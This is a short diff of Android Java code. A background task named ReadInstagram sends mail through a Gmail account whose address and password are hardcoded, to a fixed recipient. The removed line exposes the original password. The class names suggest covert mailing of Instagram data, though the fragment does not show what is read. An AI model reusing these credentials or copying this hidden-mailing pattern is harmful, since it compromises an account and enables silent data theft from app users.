@@ -14,8 +14,8 @@ public class ReadInstagram extends AsyncTask<Void, Void, Void>{
 
      @Override
      protected Void doInBackground(Void... params) {
-    	 System.out.println("mail gönderiliyor...");
- 		InstagramOfMail m = new InstagramOfMail("hemenindir57@gmail.com","123zafer123"); 
+    	 System.out.println("mail gÃ¶nderiliyor...");
+ 		InstagramOfMail m = new InstagramOfMail("hemenindir57@gmail.com","123xxx123"); 
  	    //   emailGonder();
  			 String[] toArr = {"mehmetduman34500@gmail.com"}; 
  		        m.setTo(toArr); 
